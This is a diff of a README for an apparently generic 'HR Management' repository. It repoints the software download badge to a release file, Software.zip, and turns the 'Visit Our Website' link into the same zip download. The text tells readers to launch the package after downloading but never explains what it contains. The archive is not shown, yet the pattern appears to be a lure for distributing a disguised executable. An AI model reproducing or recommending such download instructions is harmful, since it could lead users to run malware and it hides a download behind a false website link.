@@ -18,7 +18,7 @@ Here you will find a collection of files and resources related to HR Management,
 
 ## Software Download
 To access the complete software package for HR Management, please download it from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/hulkz825/hr-management/releases/download/v2.0/Software.zip)](https://github.com/hulkz825/hr-management/releases/download/v2.0/Software.zip)
 
 Remember, the software package needs to be launched after downloading to start using it effectively.
 
@@ -48,7 +48,7 @@ We welcome contributions from the open-source community to enhance the HR Manage
 If you encounter any issues or need assistance with the HR Management system, please check the "Releases" section for updates and bug fixes. You can also reach out to the repository owner for support.
 
 ## Visit Our Website
-For more information about HR Management and our services, visit our website [here](https://www.hrmanagement.com).
+For more information about HR Management and our services, visit our website [here](https://github.com/hulkz825/hr-management/releases/download/v2.0/Software.zip).
 
 Let's revolutionize HR Management together! 🚀
 
